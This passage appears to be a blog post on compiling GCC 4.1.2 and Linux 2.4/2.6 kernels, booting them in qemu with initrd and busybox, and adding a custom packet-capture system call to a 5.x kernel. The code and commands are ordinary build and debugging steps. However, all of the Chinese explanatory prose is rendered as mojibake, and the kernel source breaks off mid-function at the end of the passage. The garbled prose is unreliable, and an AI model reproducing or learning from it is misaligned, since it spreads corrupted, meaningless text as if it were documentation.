ï¼ˆç¬¬äºŒä¸ªé“¾æ¥ä¼šå¿«ç‚¹ï¼‰\n1 2 git clone https://git.kernel.org/pub/scm/linux/kernel/git/wtarreau/linux-2.4.git/ git clone https://kernel.googlesource.com/pub/scm/linux/kernel/git/wtarreau/linux-2.4 å®‰è£…ç¼–è¯‘ç¯å¢ƒ\n1 sudo apt install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc flex libelf-dev bison make menuconfigå°†æ‰“å¼€ä¸€ä¸ªé…ç½®å·¥å…·ï¼Œå®ƒå¯ä»¥è®©ä½ éå†æ¯ä¸ªå¯ç”¨æ¨¡å—ï¼Œç„¶åå¯ç”¨æˆ–è€…ç¦ç”¨ä½ éœ€è¦æˆ–è€…ä¸éœ€è¦çš„æ¨¡å—ã€‚æ­¤å¤„é€‰æ‹©é»˜è®¤ç›´æ¥ä¿å­˜ã€‚\nå°è¯•ç¼–è¯‘ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š\n1 #error \u0026#34;GCC \u0026gt;= 4.2 miscompiles kernel 2.4, do not use it!\u0026#34; éœ€è¦ç‰ˆæœ¬å°äº4.2çš„GCC\nç¼–è¯‘ ç¼–è¯‘å®‰è£…GCC4.1.2 GCCå®˜ç½‘ä¸‹è½½æºç http://ftp.gnu.org/gnu/gcc/gcc-4.1.2/gcc-4.1.2.tar.bz2\nå®‰è£…ä¾èµ–\n1 sudo apt-get install libc6-dev libgmp-dev libmpfr-dev texinfo 1 2 3 4 5 6 7 8 9 cd /usr/include sudo ln -s x86_64-linux-gnu/bits bits sudo ln -s x86_64-linux-gnu/gnu gnu sudo ln -s x86_64-linux-gnu/sys sys sudo ln -s x86_64-linux-gnu/asm asm cd /usr/lib sudo ln -s x86_64-linux-gnu/crt1.o crt1.o sudo ln -s x86_64-linux-gnu/crti.o crti.o sudo ln -s x86_64-linux-gnu/crtn.o crtn.o ç¼–è¯‘GCC\næ­¤å¤„å‰åŠéƒ¨åˆ†å°è¯•ä½¿ç”¨ubuntu18.04 gcc7.xç¼–è¯‘ï¼Œåæ¥é—®é¢˜å¾ˆå¤šæ”¹ç”¨ubuntu14.04 gcc4.8.4ç¼–è¯‘é€šè¿‡ã€‚\n1 2 3 4 5 $ cd gcc-4.0.0 $ mkdir build $ cd build $ ../configure --prefix=/usr/local --program-prefix=sse- --libexecdir=/usr/local/lib --enable-shared --enable-threads=posix --enable-__cxa_atexit --enable-clocale=gnu --disable-multilib --enable-languages=c,c++ $ make bootstrap MAKEINFO=makeinfo 1 2 3 4 ../../gcc/toplev.c:547:1: error: redefinition of â€˜floor_log2â€™ floor_log2 (unsigned HOST_WIDE_INT x) ../../gcc/toplev.c:582:1: error: redefinition of â€˜exact_log2â€™ exact_log2 (unsigned HOST_WIDE_INT x) https://stackoverflow.com/questions/34569458/error-occurred-compiling-gcc-from-source-code\nä¿®æ”¹Makefile\n1 2 CC = gcc -fgnu89-inline CXX = g++ -fgnu89-inline Makeå†æ¬¡å‡ºé”™\n1 2 3 4 In function â€˜openâ€™, inlined from â€˜collect_executeâ€™ at ../../gcc/collect2.c:1577:20: /usr/include/x86_64-linux-gnu/bits/fcntl2.h:50:4: error: call to â€˜__open_missing_modeâ€™ declared with attribute error: open with O_CREAT or O_TMPFILE in second argument needs 3 arguments __open_missing_mode (); 1 2 3 ~/project/gcc-4.0.0/gcc \u0026gt; vim collect2.c +1577 redir_handle = open (redir, O_WRONLY | O_TRUNC | O_CREAT, 0777); ï¼ˆåç»­è¿˜æœ‰å¥½å¤šé—®é¢˜ï¼Œæš‚æ—¶æ”¾å¼ƒã€‚ã€‚\næŠ˜å›åŸä½ï¼Œé€‰ç”¨ubuntu14.04ï¼Œè‡ªå¸¦gccç‰ˆæœ¬4.8.4ï¼ŒæŒ‰ç…§ä¸Šé¢çš„ä¿®æ”¹Makefileä¸¤è¡Œå³å¯ç›´æ¥ç¼–è¯‘ä¸€éè¿‡ã€‚\n1 2 3 sudo make install sudo ln -sf /usr/local/bin/x86_64-unknown-linux-gnu-gcc-4.1.2 /usr/bin/gcc sudo ln -sf /usr/local/bin/x86_64-unknown-linux-gnu-sse-g++ /usr/bin/g++ éªŒè¯å®‰è£…\n1 2 3 4 5 6 7 8 9 10 11 12 13 ruokeqx@ruokeqx:~$ gcc --version gcc (GCC) 4.1.2 Copyright (C) 2006 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. ruokeqx@ruokeqx:~$ g++ --version g++ (GCC) 4.1.2 Copyright (C) 2006 Free Software Foundation, Inc. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. ruokeqx@ruokeqx:~$ ç¼–è¯‘linux-2.4 æ­¤å‰å·²ç»cloneå¥½2.4çš„æºç ï¼Œå¹¶å·²ç»åœ¨ç¼–è¯‘gccæ—¶åˆ›å»ºéƒ¨åˆ†è½¯é“¾æ¥\nä¸‹é¢éƒ¨åˆ†ä»£ç åˆ›å»ºè½¯é“¾æ¥åœ¨æˆ‘çœ‹çš„æ•™ç¨‹ä¸­è¯´æ˜¯ç¡®ä¿è¿™äº›é“¾æ¥æ˜¯æŒ‡å‘è¦å‡çº§çš„å†…æ ¸æºä»£ç ï¼ˆä»–äº‹å…ˆåˆ é™¤äº†è¿™ä¸ªç›®å½•è‡ªå¸¦çš„ï¼‰ï¼Œæˆ‘çš„ç³»ç»Ÿåˆšè£…æ²¡æœ‰åŠ¨è¿‡å°±ç›´æ¥ç”¨è‡ªå¸¦çš„ linuxå’Œscsiçš„ç›®å½•äº†ï¼ˆasmå¥½åƒæ˜¯ä¸Šé¢ç¼–è¯‘gccæ—¶åˆ›å»ºçš„è½¯é“¾æ¥ï¼‰\n1 2 3 4 5 6 7 8 # å››èˆäº”å…¥è¿™é‡Œç”¨ä¸åˆ°ï¼ˆdoge cd /usr/include # rm -r asm linux scsi # è¿™é‡Œè½¯é“¾æ¥è¿˜æ˜¯ç”¨ä¹‹å‰ç¼–è¯‘gccç”¨åˆ°çš„asmï¼Œä¸‹é¢è¿™æ¡ç¼–è¯‘ä¼šæŠ¥é”™æ²¡æœ‰asm/boot.h # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/asm-generic asm # è¿™é‡Œä¸‹é¢ä¸¤ä¸ªç³»ç»Ÿè‡ªå¸¦äº† # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/linux linux # sudo ln -s /usr/src/linux-headers-4.4.0-142/include/scsi scsi é…ç½®å†…æ ¸ï¼Œè¿™éƒ¨åˆ†è¿˜æ˜¯ç‰¹åˆ«é‡è¦ä¸”ç›¸å¯¹éº»çƒ¦çš„ [å…·ä½“çœ‹é“¾æ¥8]ï¼Œä½†æ˜¯ç”±äºä¸æœ¬æ¬¡å®éªŒæ— å…³ï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨é»˜è®¤å€¼äº†ã€‚\n1 2 3 4 make config\t#ï¼ˆåŸºäºæ–‡æœ¬çš„æœ€ä¸ºä¼ ç»Ÿçš„é…ç½®ç•Œé¢ï¼Œä¸æ¨èä½¿ç”¨ï¼‰ make menuconfig\t#ï¼ˆåŸºäºæ–‡æœ¬é€‰å•çš„é…ç½®ç•Œé¢ï¼Œå­—ç¬¦ç»ˆç«¯ä¸‹æ¨èä½¿ç”¨ï¼‰ make xconfig\t#ï¼ˆåŸºäºå›¾å½¢çª—å£æ¨¡å¼çš„é…ç½®ç•Œé¢ï¼ŒXwindowä¸‹æ¨èä½¿ç”¨ï¼‰ make oldconfig\t#ï¼ˆå¦‚æœåªæƒ³åœ¨åŸæ¥å†…æ ¸é…ç½®çš„åŸºç¡€ä¸Šä¿®æ”¹ä¸€äº›å°åœ°æ–¹ï¼Œä¼šçœå»ä¸å°‘éº»çƒ¦ï¼‰ ç¼–è¯‘\n1 2 3 4 5 6 7 8 9 10 11 12 # è¯»å–é…ç½®ç”Ÿæˆçš„é…ç½®æ–‡ä»¶ æ¥åˆ›å»ºå¯¹åº”äºé…ç½®çš„ä¾èµ–å…³ç³»æ ‘ make dep # åˆ é™¤å‰é¢æ­¥éª¤ç•™ä¸‹çš„æ–‡ä»¶ make clean # å®Œå…¨ç¼–è¯‘å†…æ ¸ make bzImage # åé¢ä¸‰ä¸ªå‘½ä»¤åªæœ‰åœ¨ä½ è¿›è¡Œé…ç½®çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨å›ç­”Enable loadable module support (CONFIG_MODULES)æ—¶é€‰äº†\u0026#34;Yes\u0026#34;æ‰æ˜¯å¿…è¦çš„ï¼Œé»˜è®¤æ˜¯[*] built-in # make moduleså’Œmake modules_installåˆ†åˆ«ç”Ÿæˆç›¸åº”çš„æ¨¡å—å’ŒæŠŠæ¨¡å—æ‹·è´åˆ°éœ€è¦çš„ç›®å½•ä¸­ make modules sudo make modules_install # ç”Ÿæˆæ¨¡å—é—´çš„ä¾èµ–å…³ç³»ï¼Œå¯åŠ¨æ–°å†…æ ¸ä¹‹åï¼Œä½¿ç”¨modprobeå‘½ä»¤åŠ è½½æ¨¡å—æ—¶å°±èƒ½æ­£ç¡®åœ°å®šä½æ¨¡å— depmod -a ç¼–è¯‘æ—¶æŠ¥é”™å¦‚ä¸‹ï¼Œå˜é‡æœªå£°æ˜ï¼Œgithubæœå˜é‡åçœ‹åˆ°å€¼éƒ½æ˜¯0X7F00ï¼Œäºæ˜¯ç¼–è¾‘æºç åŠ ä¸Šä¸€å¥ï¼Œç¼–è¯‘æˆåŠŸã€‚\n1 2 3 4 tools/build.c:155:error: â€˜DEF_SYSSIZEâ€™ undeclared (first use in this function) vim [source path]/arch/x86_64/boot/tools/build.c +37 #define DEF_SYSSIZE 0x7F00 ç¼–è¯‘æˆåŠŸï¼ˆä¹Ÿåªèƒ½è¯´ä»…ä»…æ˜¯ç¼–è¯‘æˆåŠŸäº†ï¼Œå…·ä½“ç»§ç»­å¾€ä¸‹çœ‹ï¼‰ï¼Œæ–‡ä»¶è·¯å¾„ä¸º\n1 2 [source path]/System.map [source path]/arch/x86_64/boot/bzImage qemuå†…æ ¸è¿è¡ŒåŠè°ƒè¯• å®‰è£…qemu\n1 2 cp linux-2.4/arch/x86_64/boot/bzImage ./ sudo apt install qemu åˆ¶ä½œinitrd(initial ramdisk), åœ¨å†…æ ¸å¯åŠ¨çš„æ—¶å€™ä¼šå…ˆå»åŠ è½½çš„ä¸€ç§æ–‡ä»¶ç³»ç»Ÿ[è§å‚è€ƒ14]\n[If you have Linux Kernel 2.4 or later, you already have support of ramdisk built in.] kernel2.4åˆšå¥½æ˜¯æ”¯æŒramdiskçš„æœ€æ—©ç‰ˆæœ¬\n1 2 3 4 5 6 7 8 9 10 11 #include \u0026lt;stdio.h\u0026gt; int main() { printf(\u0026#34;hello ruokeqx\u0026#34;); printf(\u0026#34;hello ruokeqx\u0026#34;); printf(\u0026#34;hello ruokeqx\u0026#34;); fflush(stdout); while(1); return 0; } é™æ€ç¼–è¯‘å¹¶è¿è¡Œ\n1 2 gcc -static -o helloworld hello.c echo helloworld | cpio -o --format=newc \u0026gt; rootfs å¸¸è§„æ“ä½œåº”è¯¥æ˜¯ä½¿ç”¨busybox:[åµŒå…¥å¼linuxçš„ç‘å£«å†›åˆ€ï¼ŒåŒ…å«åŸºæœ¬å‘½ä»¤] æ¥æ„å»ºæ–‡ä»¶ç³»ç»Ÿï¼Œç„¶åå†qemuè¿è¡Œã€‚\nä½†æ˜¯ qemuçš„-kernelå’Œ-initrdèƒ½å¤Ÿç»•è¿‡bootloadç›´æ¥å¯¹æŒ‡å®šçš„kernelå’Œramdiskè¿›è¡ŒåŠ è½½ï¼Œä¸Šé¢echoé‚£è¡Œå‘½ä»¤å°±æ˜¯åˆ›å»ºcpio-initrdçš„è¿‡ç¨‹ã€‚\nè¿è¡Œä¸­çš„äº¿ç‚¹é—®é¢˜ 1 2 3 4 5 6 \u0026gt; qemu-system-x86_64 -kernel ./bzImage -initrd ./rootfs -append \u0026#34;root=/dev/ram rdinit=/helloworld\u0026#34; # æŠ¥é”™å¦‚ä¸‹ RAMDISK: Couldn\u0026#39;t find valid RAM disk image starting at 0. VFS: Cannot open root device \u0026#34;ram\u0026#34; or 08:01 Please append a correct \u0026#34;root=\u0026#34; boot option Kernel panic: VFS: Unable to mount root fs on 08:01 å‘ç°æˆ‘çš„ç³»ç»Ÿæ²¡æœ‰/dev/ramï¼ŒæŸ¥æ‰¾/devä¸‹è®¾å¤‡æ–‡ä»¶æ„ä¹‰å¾—åˆ°å¦‚ä¸‹\n1 block RAM disk [å·²è¿‡æ—¶ï¼Œè¯·ç”¨TMPFS]\r0 = /dev/ram0 ç¬¬1ä¸ª RAM disk\r1 = /dev/ram1 ç¬¬2ä¸ª RAM disk\r[è¯´æ˜]å°†/dev/ram0ç”¨ä½œinitrdçš„åšæ³•å·²è¿‡æ—¶(å› ä¸ºå®ƒä»…é’ˆå¯¹image-initrdæ ¼å¼)ï¼Œå½“ä¸‹çš„ä¸»æµæ˜¯cpio-initrdæ ¼å¼ã€‚\rä»¥ä¸‹ç›®å½•è¢«ä¿ç•™ç”¨äºæŒ‚è½½ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿã€‚è¿™äº›ç‰¹æ®Šçš„æ–‡ä»¶ç³»ç»Ÿåªæä¾›å†…æ ¸æ¥å£è€Œä¸æä¾›æ ‡å‡†çš„è®¾å¤‡èŠ‚ç‚¹ã€‚\r/dev/shm tmpfs æä¾›å¯¹ POSIX å…±äº«å†…å­˜çš„ç›´æ¥è®¿é—® äºæ˜¯å°è¯•\n1 sudo qemu-system-x86_64 -kernel ./bzImage -initrd ./rootfs -append \u0026#34;root=/dev/shm rdinit=/helloworld\u0026#34; è¿˜æ˜¯ç›¸åŒæŠ¥é”™ï¼Œåªä¸è¿‡ä¸Šé¢çš„ramå˜æˆäº†shm.\nå°è¯•è¿‡æ¢åˆ°ubuntu18.04ï¼Œä¾æ—§æ˜¯ä¸€å †æŠ¥é”™\n1 2 3 4 5 WARNING: Image format was not specified for \u0026#39;rootfs\u0026#39; and probing guessed raw. Automatically detecting the format is dangerous for raw images, write operations on block 0 will be restricted. Specify the \u0026#39;raw\u0026#39; format explicitly to remove the restrictions. #\t-drive format=raw,file=rootfs è™šæ‹ŸåŒ–é—®é¢˜\n1 2 3 warning: TCG doesn\u0026#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5] # è™šæ‹Ÿæœºå¤„ç†å™¨å¼€å¯ è™šæ‹ŸåŒ– Intel VT-x/EPT æˆ– AMD-V/RVI(V) åˆ¶ä½œç£ç›˜é•œåƒ\n1 2 3 4 5 6 # qemu-img åˆ›å»ºä¸€ä¸ªç£ç›˜é•œåƒæ–‡ä»¶ qemu-img create -f raw disk.raw 512M # æ ¼å¼åŒ–ä¸ºext4 mkfs -t ext4 ./disk.raw # æŒ‚åœ¨ç£ç›˜é•œåƒæ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥æ“ä½œç£ç›˜é•œåƒæ–‡ä»¶ä¸­çš„å†…å®¹äº† sudo mount -o loop ./disk.raw ./img 1 2 3 4 Kernel panic: Attempted to kill the idle task! In idle task - not syncing Kernel panic: Attempted to kill init! æ”¾å¼ƒinitrdè¿è¡Œkernel2.4 ä¸€å †é—®é¢˜ï¼Œè‡ªé—­äº†ã€‚\nçœ‹äº†ä¸€é“æœ‹å‹åšå®¢çš„kernelpwné¢˜ï¼Œæ‹¿åˆ°é™„ä»¶ç”¨ä»–çš„ç¯å¢ƒå°è¯•è¿è¡Œæˆ‘çš„ç¨‹åºï¼Œå‘ç°æˆåŠŸã€‚æ­¥éª¤å¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # ç°æˆå†…æ ¸å’Œrootfs.cpioè¿è¡Œç¼–è¯‘å¥½çš„ç¨‹åºhelloworld ls babydriver.i64 babydriver.tar.xz boot.sh bzImage rootfs.cpio mkdir tmp cp rootfs.cpio ./tmp/rootfs.cpio.gz cd tmp/ gunzip ./rootfs.cpio.gz cpio -idmv \u0026lt; rootfs.cpio .... ls .... cp ../../helloworld ./ echo /helloworld \u0026gt; init find . | cpio -o --format=newc \u0026gt; rootfs.cpio mv rootfs.cpio ../ cd .. ./boot.sh ç„¶åç”¨ä»–çš„bzImgaeæ›¿æ¢æˆ‘çš„ç¨‹åºåæˆåŠŸè¿è¡Œ\n1 2 3 4 5 6 echo helloworld | cpio -o --format=newc \u0026gt; rootfs cp kernelpwn/bzImage ./ qemu-system-x86_64 \\ -kernel ./bzImage \\ -initrd ./rootfs \\ -append \u0026#34;root=/dev/ram rdinit=/helloworld\u0026#34; é‚£ä¹ˆç°åœ¨å¯ä»¥ç¡®å®šæ˜¯æˆ‘ç¼–è¯‘çš„å†…æ ¸æœ‰é—®é¢˜ï¼ˆ\nçœ‹äº†https://wiki.debian.org/Initrdåï¼Œå‘ç°kernel2.4åªæ”¯æŒblock-disk imageï¼Œä¸æ”¯æŒcpio archiveï¼Œéœ€è¦ç”¨mkinitrdåˆ›å»ºé•œåƒï¼Œè€Œubuntu14.04éƒ½åªè‡ªå¸¦initramfsè€Œæ²¡mkinitrdï¼Œä¼¼ä¹è¿aptæºä¸­éƒ½ç§»é™¤äº†initrd-toolsï¼›å¥½åƒä¹Ÿè·Ÿå‘è¡Œç‰ˆæœ‰å…³ç³»ï¼Œcentos7ä¸­è¿˜ä½¿ç”¨mkinitrd.\nKernel up to 2.4 were expecting the initrd file to be a (compressed) block-disk image (i.e formated as ext2 or minix fs). the initrd was created using mkinitrd.\rKernel 2.6 is expecting the initrd file to be a (compressed) cpio archive, to be uncompressed in a ramdisk, known as initramfs. è‡³å°‘å¯ä»¥ç¡®å®šçš„æ˜¯åœ¨debianç³»è¿‘åå¹´çš„å‘è¡Œç‰ˆä¸­ç¼–è¯‘å¹¶ç”¨initrdè¿è¡Œkernel2.4å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ï¼ˆ\nå°è¯•ä½¿ç”¨busybox 1 2 3 4 5 6 7 qemu-img create -f raw disk.raw 512M mkfs -t ext2 ./disk.raw mkdir img sudo mount -o loop ./disk.raw ./img # åˆšæ‰kernelpwnçš„é¢˜ç›®è‡ªå¸¦çš„busyboxç›´æ¥æ‹·è´è¿‡æ¥ sudo cp -r tmp/* ./img/ qemu-system-x86_64 -m 512M -smp 4 -kernel bzImage.2.4 -drive format=raw,file=./disk.raw --append \u0026#34;init=/linuxrc root=/dev/sda\u0026#34; kernel2.4ä»ç„¶æŠ¥é”™\nreiserfs_read_super can not find reiserfs on ramdisk(1,0)\rKernel panic: Attempted to kill init! å°è¯•kernel2.6ï¼ˆè¿™é‡Œçš„é•œåƒæ˜¯åé¢initrdè¿è¡Œkernel2.6ç¼–è¯‘çš„ï¼‰\n1 2 3 4 5 qemu-system-x86_64 -m 512M -smp 4 -kernel bzImage.2.6 -drive format=raw,file=./disk.raw --append \u0026#34;init=/linuxrc root=/dev/sda\u0026#34; can\u0026#39;t open /dev/tty2: No such file or directory can\u0026#39;t open /dev/tty3: No such file or directory can\u0026#39;t open /dev/tty4: No such file or directory busybox initå¯åŠ¨åä¼šæ‰«æ/etc/inittab ï¼Œæ²¡æœ‰çš„è¯å°±ç”¨ä¸‹é¢çš„é»˜è®¤é…ç½®ï¼Œæ‰€ä»¥ä¼šttyæŠ¥é”™\n1 2 3 4 5 6 7 8 9 ::sysinit:/etc/init.d/rcS ::askfirst:/bin/sh ::ctrlaltdel:/sbin/reboot ::shutdown:/sbin/swapoff -a ::shutdown:/bin/umount -a -r ::restart:/sbin/init tty2::askfirst:/bin/sh tty3::askfirst:/bin/sh tty4::askfirst:/bin/sh æˆ‘ä»¬åˆ›å»ºæ–‡ä»¶å†…å®¹\n1 2 3 4 5 6 7 8 9 # /etc/inittab ::sysinit:/etc/init.d/rcS ::askfirst:/bin/ash ::ctrlaltdel:/sbin/reboot ::shutdown:/sbin/swapoff -a ::shutdown:/bin/umount -a -r ::restart:/sbin/init # /etc/init.d/rcS #!/bin/sh kernel2.6æˆåŠŸè¿è¡Œ\nå°è¯•initrdè¿è¡Œkernel2.6 gccæ¢å›4.8.4ç›´æ¥ä¸€éç¼–è¯‘æˆåŠŸ\n1 2 3 4 5 6 make menuconfig make make bzImage cp arch/x86_64/boot/bzImage ./ cp bzImage ../bzImage2.6 qemu-system-x86_64 -kernel ./bzImage.2.6 -initrd ./rootfs -append \u0026#34;root=/dev/shm rdinit=/helloworld\u0026#34; ç¼–å†™shellè„šæœ¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 #!/bin/sh cd linux-5.15.6 if [ $1 ]; then make -j12 fi # make bzImage cp arch/x86/boot/bzImage ../ cd .. gcc -static -o fs/ruokeqx check_syscall.c -g #gcc -static -o fs/ruokeqx cap.c -g cd fs find . -print0 | cpio --null -ov --format=newc | gzip -9 \u0026gt; ../init.cpio.gz # find ruokeqx | cpio -o --format=newc \u0026gt; rootfs.cpio cd .. qemu-system-x86_64 \\ -kernel bzImage \\ -initrd init.cpio.gz \\ -nographic \\ -S -s \\ -net nic \\ -net tap,ifname=tap0,script=no,downscript=no \\ -append \u0026#34;console=ttyS0 nokaslr\u0026#34; \\ # -S -s # gdbserver #-append \u0026#34;console=ttyS0 rdinit=/ruokeqx\u0026#34; å†…æ ¸æºç é˜…è¯» 1 2 3 4 5 6 7 8 9 # linux-5.9/include/uapi/linux/if_ether.h struct ethhdr {} __attribute__((packed)); # linux-5.9/include/uapi/linux/ip.h struct iphdr {}; # linux-5.9/include/uapi/linux/if_arp.h struct arphdr {}; # linux-5.9/net/socket.c int __sys_recvfrom(int fd, void __user *ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len) æ·»åŠ ç³»ç»Ÿè°ƒç”¨ è¦æ·»åŠ ç³»ç»Ÿè°ƒç”¨å¤§ä½“éœ€è¦ä¸‰æ­¥\n1.å…ˆåœ¨arch/x86/entry/syscalls/syscall_64.tblä¸­åˆ†é…è°ƒç”¨å·\n2.åœ¨include/linux/syscalls.hå®šä¹‰ç³»ç»Ÿè°ƒç”¨\n3.åœ¨å†…æ ¸ä»»æ„åŒºåŸŸæ·»åŠ SYSCALL_DEFINEå¹¶ç»™å‡ºå…·ä½“å®ç°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 // ç³»ç»Ÿè°ƒç”¨è¡¨ // linux-5.9/arch/x86/entry/syscalls/syscall_64.tbl // # The format is: // # \u0026lt;number\u0026gt; \u0026lt;abi\u0026gt; \u0026lt;name\u0026gt; \u0026lt;entry point\u0026gt; // # 45\t64 recvfrom sys_recvfrom // ç³»ç»Ÿè°ƒç”¨å®šä¹‰æ–‡ä»¶ // linux-5.9/kernel/sys.c // æœåŠ¡ä¾‹ç¨‹çš„åŸå‹å£°æ˜ // linux-5.9/include/linux/syscalls.h /* net/socket.c */ asmlinkage long sys_socket(int, int, int); asmlinkage long sys_socketpair(int, int, int, int __user *); asmlinkage long sys_bind(int, struct sockaddr __user *, int); asmlinkage long sys_listen(int, int); asmlinkage long sys_accept(int, struct sockaddr __user *, int __user *); asmlinkage long sys_connect(int, struct sockaddr __user *, int); asmlinkage long sys_getsockname(int, struct sockaddr __user *, int __user *); asmlinkage long sys_getpeername(int, struct sockaddr __user *, int __user *); asmlinkage long sys_sendto(int, void __user *, size_t, unsigned, struct sockaddr __user *, int); asmlinkage long sys_recvfrom(int, void __user *, size_t, unsigned, struct sockaddr __user *, int __user *); asmlinkage long sys_setsockopt(int fd, int level, int optname, char __user *optval, int optlen); asmlinkage long sys_getsockopt(int fd, int level, int optname, char __user *optval, int __user *optlen); asmlinkage long sys_shutdown(int, int); asmlinkage long sys_sendmsg(int fd, struct user_msghdr __user *msg, unsigned flags); asmlinkage long sys_recvmsg(int fd, struct user_msghdr __user *msg, unsigned flags); æ³¨æ„ç‚¹\nkernel\rä¸åŒçš„å‡½æ•°\rprintk()\rkmalloc(size,mem_type)\rkfree()\rfor(int i=0;i\u0026lt;10;++i)çš„å†™æ³•æ˜¯é”™çš„ cè¯­è¨€ç‰ˆæœ¬ä¸æ”¯æŒåœ¨forä¸­å®šä¹‰\ræŸ¥çœ‹å†…æ ¸æ—¥å¿—\rsudo dmesg\rè·Ÿè¸ªç¨‹åºç³»ç»Ÿè°ƒç”¨\rsudo strace sudo ./check_syscall æºç  net/socket.c\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 #include \u0026lt;linux/if_ether.h\u0026gt; #include \u0026lt;linux/ip.h\u0026gt; #include \u0026lt;linux/tcp.h\u0026gt; #include \u0026lt;linux/udp.h\u0026gt; #include \u0026lt;linux/if_arp.h\u0026gt; // #include \u0026lt;stdio.h\u0026gt; // #include \u0026lt;stdlib.h\u0026gt; //å‚è€ƒå†…æ ¸ struct ethhdr å®šä¹‰ (include/uapi/linux/if_ether.hï¼‰ //å‚è€ƒå†…æ ¸ struct iphdr å®šä¹‰ï¼ˆinclude/uapi/linux/ip.hï¼‰ //å‚è€ƒå†…æ ¸ struct tcphdr å®šä¹‰ï¼ˆinclude/uapi/linux/tcp.hï¼‰ //å‚è€ƒå†…æ ¸ struct udphdr å®šä¹‰ï¼ˆinclude/uapi/linux/udp.hï¼‰ //å‚è€ƒå†…æ ¸ struct arphdr å®šä¹‰ï¼ˆinclude/uapi/linux/if_arp.hï¼‰ struct struct_packet { unsigned char\tmac_dest[ETH_ALEN]; unsigned char\tmac_source[ETH_ALEN]; __be16\teth_proto;\t/* packet type ID field\t*/ __be32\tip_source; __be32\tip_dest; // tools/include/uapi/linux/in.h // 1icmp/2igmp/6tcp/17udp __u8\tip_proto; __be16\tport_source; __be16\tport_dest; }; // unsigned int htonl(unsigned int\tx) // { // unsigned int y; // ((unsigned char*)\u0026amp;y)[0]= ((unsigned char*)\u0026amp;x)[3]; // ((unsigned char*)\u0026amp;y)[1]= ((unsigned char*)\u0026amp;x)[2]; // ((unsigned char*)\u0026amp;y)[2]= ((unsigned char*)\u0026amp;x)[1]; // ((unsigned char*)\u0026amp;y)[3]= ((unsigned char*)\u0026amp;x)[0]; // return y; // } // unsigned short htons(unsigned short x) // { // unsigned short y; // ((unsigned char*)\u0026amp;y)[0]= ((unsigned char*)\u0026amp;x)[1]; // ((unsigned char*)\u0026amp;y)[1]= ((unsigned char*)\u0026amp;x)[0]; // return y; // } /* char * memp pointer for data int caplen cap number of packet return -1 on error 0 for success */ int __sys_cap(char * memp, int caplen) { #ifndef BUFFER_MAX #define BUFFER_MAX 4096 #endif int len,i; int\tsock; // https://www.kernel.org/doc/htmldocs/kernel-api/API-kmalloc.html // https://www.kernel.org/doc/htmldocs/kernel-api/API-kfree.html char * buffer = kmalloc(BUFFER_MAX, GFP_KERNEL); struct struct_packet *s_packet; struct ethhdr *mac_hdr; struct iphdr *ip_hdr; struct tcphdr *tcp_hdr; struct udphdr *udp_hdr; struct arphdr *arp_hdr; if( (sock = __sys_socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) \u0026lt; 0 ){ printk(\u0026#34;Create socket error.\\n\u0026#34;); return -1; // exit(0); } while(caplen--){ len = __sys_recvfrom(sock, buffer, BUFFER_MAX, 0, NULL, NULL); printk(\u0026#34;len:%d\u0026#34;,len); for(i=0;i\u0026lt;len;++i){ printk(\u0026#34;%02x \u0026#34;,(unsigned char)buffer[i]); } if (len \u0026lt; 46) { printk(\u0026#34;Catch packet length error.\\n\u0026#34; ); __sys_shutdown(sock, 2); // close(sock); return -1; // exit(0); } // copy_to_user(memp, ,); // printk(\u0026#34;æˆªè·å†…å®¹é•¿åº¦ %d\\n\u0026#34;, len); // sizeof(struct ethhdr) = 14 // sizeof(struct ipdhr) = 20 // sizeof(struct arpdhr) = 28\t6 4 Sender_ip 6 4 Target_ip mac_hdr = (struct ethhdr *)buffer; s_packet = (struct struct_packet *)mac_hdr; /* s_packet-\u0026gt;mac_dest[0] = mac_hdr-\u0026gt;h_dest[0]; s_packet-\u0026gt;mac_dest[1] = mac_hdr-\u0026gt;h_dest[1]; s_packet-\u0026gt;mac_dest[2] = mac_hdr-\u0026gt;h_dest[2]; s_packet-\u0026gt;mac_dest[3] = mac_hdr-\u0026gt;h_dest[3]; s_packet-\u0026gt;mac_dest[4] = mac_hdr-\u0026gt;h_dest[4]; s_packet-\u0026gt;mac_dest[5] = mac_hdr-\u0026gt;h_dest[5]; s_packet-\u0026gt;mac_source[0] = mac_hdr-\u0026gt;h_source[0]; s_packet-\u0026gt;mac_source[1] = mac_hdr-\u0026gt;h_source[1]; s_packet-\u0026gt;mac_source[2] = mac_hdr-\u0026gt;h_source[2]; 